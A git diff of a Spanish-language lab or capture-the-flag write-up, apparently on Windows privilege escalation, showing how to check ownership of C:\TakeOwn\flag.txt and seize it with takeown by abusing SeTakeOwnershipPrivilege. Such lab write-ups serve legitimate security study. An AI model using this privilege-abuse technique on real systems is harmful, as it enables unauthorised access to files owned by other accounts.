@@ -358,7 +358,27 @@ Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attrib
 ```
 <img width="1025" height="163" alt="image" src="https://github.com/user-attachments/assets/5213552c-fcea-43ee-bbef-f4a81d6e68f2" />
 
-No podemos visualizar el owner por lo que probamos con el comando en cmd:
+No podemos visualizar el owner por lo que probamos con el comando en cmd para concultar el directorio padre:
 ```powershell
-cmd /c dir /q 'C:\TakeOwn\flag.txt'
+cmd /c dir /q 'C:\TakeOwn\'
 ```
+<img width="557" height="159" alt="image" src="https://github.com/user-attachments/assets/25ba9f87-e73a-458f-b829-bcfb5e04ca67" />
+
+Vemos que la carpeta está bajo la propiedad de la cuenta `WINLPE-SRV01\sccm_svc` y contiene `flag.txt`.
+
+Como nuestro token tiene `SeTakeOwnsershipPrivilege` habilitado podemos ejecutar `takeown` para hacernos propietarios del archivo:
+
+```powershell
+takeown /f 'C:\TakeOwn\flag.txt'
+```
+
+<img width="974" height="85" alt="image" src="https://github.com/user-attachments/assets/11dd6a04-1fa4-4b0e-a149-c21b37f2700b" />
+
+Logramos cambiar la propiedad del archivo correctamente. Procedemos a verificarlo con el comando que no funcionó al principio:
+
+```powershell
+Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name='Owner';Expression={ (Get-Acl $_.FullName).Owner }}
+```
+
+<img width="1020" height="205" alt="image" src="https://github.com/user-attachments/assets/e3559b07-cab4-40cd-ad4b-531d9d9c87c1" />
+
